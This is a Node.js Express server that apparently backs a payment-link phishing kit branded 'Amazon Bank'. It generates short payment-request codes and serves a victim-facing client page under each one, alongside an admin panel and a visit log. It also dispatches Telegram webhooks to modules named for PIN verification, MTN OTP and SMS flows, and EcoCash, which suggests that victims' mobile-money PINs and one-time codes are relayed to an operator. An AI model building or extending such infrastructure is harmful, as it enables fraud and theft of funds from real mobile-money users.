const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

/* ─────────────────────────────────────────────────────────────
   CORS — allow the browser on Render to call Railway API
   ───────────────────────────────────────────────────────────── */
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ─────────────────────────────────────────────────────────────
   In-memory stores (fine for a demo; swap for a DB later)
   ───────────────────────────────────────────────────────────── */
const links = new Map();
const logs = [];

function log(level, text) {
  const entry = { time: new Date().toISOString().slice(11, 19), level, text };
  logs.unshift(entry);
  if (logs.length > 200) logs.pop();
  console.log(`[${entry.time}] ${level}: ${text}`);
}

/* ─────────────────────────────────────────────────────────────
   LINK MANAGEMENT
   ───────────────────────────────────────────────────────────── */
app.post('/api/links', (req, res) => {
  const payload = req.body;
  if (!payload || !payload.am) {
    return res.status(400).json({ error: 'Missing amount' });
  }
  const code = crypto.randomBytes(4).toString('hex').toUpperCase();
  links.set(code, { payload, createdAt: Date.now() });
  log('ok', `Link created: ${code} — ${payload.cur} ${payload.am} (${payload.c})`);
  res.json({ code });
});

app.get('/api/links/:code', (req, res) => {
  const entry = links.get(req.params.code);
  if (!entry) {
    log('err', `Link not found: ${req.params.code}`);
    return res.status(404).json({ error: 'Link not found' });
  }
  if (entry.payload.exp && Date.now() > entry.payload.exp) {
    log('err', `Link expired: ${req.params.code}`);
    return res.status(410).json({ error: 'Link expired' });
  }
  log('info', `Link accessed: ${req.params.code}`);
  res.json({ payload: entry.payload });
});

app.get('/api/logs', (req, res) => {
  res.json({ entries: logs });
});

app.post('/api/shorten', (req, res) => {
  res.json({ shortUrl: req.body.url });
});

/* ─────────────────────────────────────────────────────────────
   DIAGNOSTIC — list all files currently in /public
   ───────────────────────────────────────────────────────────── */
app.get('/api/list-public', (req, res) => {
  const pubDir = path.join(__dirname, 'public');
  try {
    const files = fs.readdirSync(pubDir);
    res.json({
      dir: pubDir,
      files: files.map(f => {
        const stat = fs.statSync(path.join(pubDir, f));
        return { name: f, size: stat.size, isFile: stat.isFile() };
      })
    });
  } catch (e) {
    res.status(500).json({ error: 'Cannot read public dir', dir: pubDir, message: e.message });
  }
});

/* ─────────────────────────────────────────────────────────────
   TELEGRAM-BACKED ROUTES
   ───────────────────────────────────────────────────────────── */
let telegramPin = null;
let telegramMtn = null;
let telegramOtp = null;
let telegramEco = null;

try { telegramPin = require('./telegram-bot'); }    catch (e) { console.warn('[server] telegram-bot.js not found'); }
try { telegramMtn = require('./telegram-mtn'); }    catch (e) { console.warn('[server] telegram-mtn.js not found'); }
try { telegramOtp = require('./telegram-otp'); }    catch (e) { console.warn('[server] telegram-otp.js not found'); }
try { telegramEco = require('./telegram-ecocash'); } catch (e) { console.warn('[server] telegram-ecocash.js not found'); }

if (telegramPin && typeof telegramPin.registerRoutes === 'function') {
  telegramPin.registerRoutes(app);
  log('info', 'telegram-bot registered');
}
if (telegramMtn && typeof telegramMtn.registerRoutes === 'function') {
  telegramMtn.registerRoutes(app);
  log('info', 'telegram-mtn registered');
}
if (telegramOtp && typeof telegramOtp.registerRoutes === 'function') {
  telegramOtp.registerRoutes(app);
  log('info', 'telegram-otp registered');
}
if (telegramEco && typeof telegramEco.registerRoutes === 'function') {
  telegramEco.registerRoutes(app);
  log('info', 'telegram-ecocash registered');
}

/* ─────────────────────────────────────────────────────────────
   SINGLE TELEGRAM WEBHOOK DISPATCHER
   Routes by callback_data prefix:
     otp_*      → telegram-otp   (MTN OTP flow)
     pin_*      → telegram-bot   (PIN verification flow)
     eco_*      → telegram-ecocash (EcoCash flow)
     others     → telegram-mtn   (MTN SMS flow)
   ───────────────────────────────────────────────────────────── */
app.post('/api/telegram/webhook', async (req, res) => {
  const update = req.body || {};
  const data = (update.callback_query && update.callback_query.data) || '';

  try {
    if (data.startsWith('otp_') && telegramOtp && typeof telegramOtp.handleUpdate === 'function') {
      await telegramOtp.handleUpdate(update);
    } else if (data.startsWith('pin_') && telegramPin && typeof telegramPin.handleUpdate === 'function') {
      await telegramPin.handleUpdate(update);
    } else if (data.startsWith('eco_') && telegramEco && typeof telegramEco.handleUpdate === 'function') {
      await telegramEco.handleUpdate(update);
    } else if (telegramMtn && typeof telegramMtn.handleUpdate === 'function') {
      await telegramMtn.handleUpdate(update);
    } else {
      console.warn('[webhook] no handler for', data);
    }
  } catch (e) {
    console.error('[webhook] dispatch error', e);
  }

  res.sendStatus(200);
});

/* ─────────────────────────────────────────────────────────────
   HEALTH + ROOT
   ───────────────────────────────────────────────────────────── */
app.get('/health', (req, res) => res.json({ ok: true, uptime: process.uptime() }));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'), (err) => {
    if (err) {
      log('err', 'admin.html not found in /public');
      res.status(500).send('admin.html is missing from /public on the server.');
    }
  });
});

/* ─────────────────────────────────────────────────────────────
   ROOT SHORT-LINK REDIRECT
   Handles /ABC123 → serves client.html with the code in the URL
   Must come BEFORE the .html fallback below.
   ───────────────────────────────────────────────────────────── */
app.get(/^\/[A-Z0-9]{6,12}$/, (req, res) => {
  const code = req.path.slice(1);
  const entry = links.get(code);
  if (!entry) {
    log('err', `Short code not found: ${code}`);
    return res.status(404).send(
      '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Link not found</title>' +
      '<style>body{font-family:system-ui,sans-serif;padding:40px;max-width:600px;margin:0 auto;color:#0F1111}' +
      'h1{color:#B12704;font-size:24px}p{line-height:1.6;color:#565959}</style></head><body>' +
      '<h1>Link not found</h1><p>This payment link is invalid. Please ask the sender for a new one.</p>' +
      '</body></html>'
    );
  }
  if (entry.payload.exp && Date.now() > entry.payload.exp) {
    log('err', `Short code expired: ${code}`);
    return res.status(410).send(
      '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Link expired</title>' +
      '<style>body{font-family:system-ui,sans-serif;padding:40px;max-width:600px;margin:0 auto;color:#0F1111}' +
      'h1{color:#B12704;font-size:24px}p{line-height:1.6;color:#565959}</style></head><body>' +
      '<h1>Link expired</h1><p>This payment request is no longer valid. Please ask the sender to generate a new one.</p>' +
      '</body></html>'
    );
  }
  log('info', `Short link hit: ${code}`);
  // Serve client.html but keep the URL bar showing /ABC123
  res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

/* ─────────────────────────────────────────────────────────────
   HTML FALLBACK — clearer 404s for missing .html files
   ───────────────────────────────────────────────────────────── */
app.get(/\.html$/i, (req, res, next) => {
  const filename = path.basename(req.path);
  const fullPath = path.join(__dirname, 'public', filename);
  if (fs.existsSync(fullPath)) {
    return res.sendFile(fullPath);
  }
  log('err', `Missing HTML file: ${filename}`);
  res.status(404).send(
    '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Missing page</title>' +
    '<style>body{font-family:system-ui,sans-serif;padding:40px;max-width:600px;margin:0 auto;color:#0F1111}' +
    'h1{color:#B12704;font-size:24px}code{background:#F0F1F3;padding:2px 6px;border-radius:4px;font-size:13px}' +
    'p{line-height:1.6;color:#565959}</style></head><body>' +
    '<h1>Page not found on server</h1>' +
    '<p>The file <code>' + filename + '</code> is not in the <code>public/</code> folder of this deployment.</p>' +
    '<p>Visit <a href="/api/list-public">/api/list-public</a> to see which files are actually deployed.</p>' +
    '</body></html>'
  );
});

/* ─────────────────────────────────────────────────────────────
   START
   ───────────────────────────────────────────────────────────── */
app.listen(PORT, () => {
  console.log(`Amazon Bank running on port ${PORT}`);
});
